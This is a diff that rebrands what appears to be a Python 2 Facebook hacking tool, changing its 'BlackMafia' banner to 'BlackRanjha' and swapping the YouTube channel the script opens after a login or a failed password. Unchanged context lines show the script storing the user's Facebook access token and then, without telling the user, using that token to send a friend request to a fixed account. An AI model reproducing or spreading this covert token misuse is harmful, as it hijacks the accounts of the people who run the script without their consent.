@@ -98,14 +98,14 @@ _______$$$$$$$$$$_$$$________________________$$$
 ____________________$$$$__________________$$$$
 ________________________$$$$$$$$$$$$$$$$$$$
  
-\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
-\033[1;91m:•◈•╔╗─────────╔╗───────╔╗
-\033[1;91m:•◈•║║─────────║║───────║║
-\033[1;91m:•◈•║║╔══╦╗╔╦══╣╚═╦══╦══╣║╔╦══╦═╗
-\033[1;91m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   
-\033[1;91m:•◈•║╚╣╚╝╠╗╔╣║═╣║║║╔╗║╚═╣╔╗╣║═╣║    
-\033[1;91m:•◈•╚═╩══╝╚╝╚══╩╝╚╩╝╚╩══╩╝╚╩══╩╝
-\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
+\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackRanjha\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
+\033[1;91m╔═╗╔═╗╔═══╗╔═══╗╔════╗╔══╗╔═══╗
+\033[1;91m║║╚╝║║║╔═╗║║╔═╗║║╔╗╔╗║╚╣─╝║╔═╗║
+\033[1;91m║╔╗╔╗║║╚═╝║║║─║║╚╝║║╚╝─║║─║║─║║
+\033[1;91m║║║║║║║╔╗╔╝║╚═╝║──║║───║║─║╚═╝║
+\033[1;91m║║║║║║║║║╚╗║╔═╗║──║║──╔╣─╗╚══╗║
+\033[1;91m╚╝╚╝╚╝╚╝╚═╝╚╝─╚╝──╚╝──╚══╝───╚
+\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackRanjha\033[1;95m•◈•▬•◈•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -193,10 +193,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+            os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+        os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 
 def login():
 	os.system('clear')
@@ -250,7 +250,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
